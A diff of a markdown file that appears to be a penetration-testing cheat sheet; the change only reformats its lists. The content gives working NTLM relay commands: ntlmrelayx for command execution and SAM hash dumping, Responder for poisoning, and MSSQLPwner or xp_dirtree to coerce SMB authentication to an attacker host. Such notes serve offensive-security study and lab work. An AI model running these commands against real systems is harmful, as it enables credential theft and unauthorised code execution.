@@ -242,15 +242,26 @@ $EncodedText
 
 <ins>Set up NTLM Relay</ins>:
 
-- Command Execution: `ntlmrelayx.py --no-http-server -smb2support -t 192.168.156.6 -c 'command/base64 blob here'`
-- SAM Dump: `ntlmrelayx.py --no-http-server -smb2support -t smb://172.16.192.152`
+Command Execution: 
+
+- `ntlmrelayx.py --no-http-server -smb2support -t 192.168.156.6 -c 'command/base64 blob here'`
+
+SAM Dump: 
+
+- `ntlmrelayx.py --no-http-server -smb2support -t smb://172.16.192.152`
 
 <ins>Fire up Responder</ins>
 
 - `sudo responder -I tun0 -A` (make sure SMB is turned OFF in /etc/responder/Responder.conf)
 
 <ins>Trigger SMB authentication</ins>:
-- MSSQLPwner: `mssqlpwner user:pass@<MSSQL INSTANCE IP> -windows-auth ntlm-relay -relay-method (xp_dirtree/xp_subdirs/xp_fileexist) <OUR ATTACKING MACHINE>`
-- impacket: `xp_dirtree \\192.168.45.196\blabla`
+
+MSSQLPwner: 
+
+- `mssqlpwner user:pass@<MSSQL INSTANCE IP> -windows-auth ntlm-relay -relay-method (xp_dirtree/xp_subdirs/xp_fileexist) <OUR ATTACKING MACHINE>`
+
+impacket: 
+
+- `xp_dirtree \\192.168.45.196\blabla`
 
 
